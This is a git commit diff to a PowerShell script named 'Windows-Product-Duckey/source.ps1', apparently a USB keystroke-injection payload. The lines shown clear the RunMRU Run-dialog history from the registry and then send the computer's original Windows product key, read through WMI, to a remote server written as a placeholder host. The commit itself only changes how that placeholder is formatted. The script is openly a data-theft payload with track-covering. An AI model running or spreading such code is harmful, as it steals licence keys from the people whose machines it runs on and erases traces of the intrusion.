21e64416d241a9e86b0990f0e6b1a8d3200e87f4
Julien Morice <120029567+Who-Is-Julien@users.noreply.github.com>
2023-03-03 18:54:32 +0100

    Update source.ps1

--- Windows-Product-Duckey/source.ps1
+++ Windows-Product-Duckey/source.ps1
@@ -5,4 +5,4 @@
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
 
 #Retrieve and send the computer's original product key to a remote server
-Invoke-WebRequest -Uri "http://REMOTE_IP_ADDRESS?duckey=$((Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey)" -Method Get -UseBasicParsing | Out-Null
+Invoke-WebRequest -Uri "http://<REMOTE_IP_ADDRESS>?duckey=$((Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey)" -Method Get -UseBasicParsing | Out-Null
